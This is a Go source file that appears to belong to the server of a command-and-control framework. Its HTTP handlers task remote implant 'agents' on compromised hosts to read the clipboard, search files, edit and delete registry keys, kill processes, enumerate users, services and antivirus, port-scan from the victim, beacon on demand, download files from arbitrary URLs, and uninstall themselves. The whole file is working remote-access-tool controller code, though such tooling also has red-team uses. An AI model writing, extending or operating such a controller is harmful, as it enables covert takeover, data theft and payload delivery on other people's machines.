package server

import (
	"log/slog"
	"net/http"

	"github.com/gin-gonic/gin"
)

// ── Process / clipboard / find / registry / simple recon ops ───────────────

func (s *Server) handleRequestPS(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"ps", "request_ps", "process list"})
}

func (s *Server) handleSuspendProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if target == "" {
		respondError(c, http.StatusBadRequest, "target PID is required")
		return
	}
	if err := validatePID(target); err != nil {
		respondError(c, http.StatusBadRequest, "invalid PID")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "suspend", Command: target})
	if task == nil {
		return
	}
	slog.Info("Suspend requested", "agent_id", id, "target", target)
	s.dispatchTask(c, task, "suspend_process", target)
}

func (s *Server) handleResumeProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if target == "" {
		respondError(c, http.StatusBadRequest, "target PID is required")
		return
	}
	if err := validatePID(target); err != nil {
		respondError(c, http.StatusBadRequest, "invalid PID")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "resume", Command: target})
	if task == nil {
		return
	}
	slog.Info("Resume requested", "agent_id", id, "target", target)
	s.dispatchTask(c, task, "resume_process", target)
}

func (s *Server) handleKillProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if target == "" {
		respondError(c, http.StatusBadRequest, "target PID is required")
		return
	}
	if err := validatePID(target); err != nil {
		respondError(c, http.StatusBadRequest, "invalid PID")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "killproc", Command: target})
	if task == nil {
		return
	}
	slog.Info("Kill process requested", "agent_id", id, "target", target)
	s.dispatchTask(c, task, "kill_process", target)
}

func (s *Server) handleClipboardGet(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"clipboard_get", "clipboard_get", ""})
}

func (s *Server) handleClipboardSet(c *gin.Context) {
	id := c.Param("id")
	data := c.PostForm("data")
	if data == "" {
		data = c.PostForm("command")
	}
	if data == "" {
		respondError(c, http.StatusBadRequest, "clipboard data is required")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "clipboard_set", Command: data})
	if task == nil {
		return
	}
	slog.Info("Clipboard set requested", "agent_id", id)
	s.dispatchTask(c, task, "clipboard_set", "")
}

func (s *Server) handleFindFiles(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	path := c.PostForm("path")
	pattern := c.PostForm("pattern")
	if path == "" {
		path = c.PostForm("command")
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "find", Command: pattern, Path: path})
	if task == nil {
		return
	}
	slog.Info("Find files requested", "agent_id", id, "path", path, "pattern", pattern)
	s.dispatchTask(c, task, "find_files", path+" "+pattern)
}

func (s *Server) handleRegGet(c *gin.Context) {
	id := c.Param("id")
	key := c.PostForm("key")
	if key == "" {
		key = c.PostForm("command")
	}
	if key == "" {
		respondError(c, http.StatusBadRequest, "registry key path is required")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "reg_get", Command: key})
	if task == nil {
		return
	}
	slog.Info("Reg get requested", "agent_id", id, "key", key)
	s.dispatchTask(c, task, "reg_get", key)
}

func (s *Server) handleRegSet(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	data := c.PostForm("data")
	if path == "" {
		respondError(c, http.StatusBadRequest, "registry path is required")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "reg_set", Path: path, Data: data})
	if task == nil {
		return
	}
	slog.Info("Reg set requested", "agent_id", id, "path", path)
	s.dispatchTask(c, task, "reg_set", path)
}

func (s *Server) handleRegDelete(c *gin.Context) {
	id := c.Param("id")
	key := c.PostForm("key")
	if key == "" {
		key = c.PostForm("command")
	}
	if key == "" {
		respondError(c, http.StatusBadRequest, "registry key path is required")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "reg_delete", Command: key})
	if task == nil {
		return
	}
	slog.Info("Reg delete requested", "agent_id", id, "key", key)
	s.dispatchTask(c, task, "reg_delete", key)
}

func (s *Server) handleReboot(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"reboot", "reboot", ""})
}

func (s *Server) handleShutdown(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"shutdown", "shutdown", ""})
}

func (s *Server) handleListDrives(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"drives", "list_drives", ""})
}

func (s *Server) handleBeaconNow(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"beacon_now", "beacon_now", ""})
}

func (s *Server) handleListServices(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"services", "list_services", ""})
}

func (s *Server) handlePortScan(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "portscan", Command: target})
	if task == nil {
		return
	}
	slog.Info("Portscan requested", "agent_id", id, "target", target)
	s.dispatchTask(c, task, "portscan", target)
}

func (s *Server) handleNetstat(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"netstat", "netstat", ""})
}

func (s *Server) handleUsers(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"users", "users", ""})
}

func (s *Server) handleAV(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"av", "av", ""})
}

func (s *Server) handleDownloadURL(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	url := c.PostForm("url")
	dest := c.PostForm("dest")
	if url == "" {
		url = c.PostForm("command")
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "download_url", Command: url, Shell: dest, Path: dest})
	if task == nil {
		return
	}
	slog.Info("Download URL requested", "agent_id", id, "url", url)
	s.dispatchTask(c, task, "download_url", url+" -> "+dest)
}

func (s *Server) handleUninstall(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"uninstall", "uninstall", ""})
}
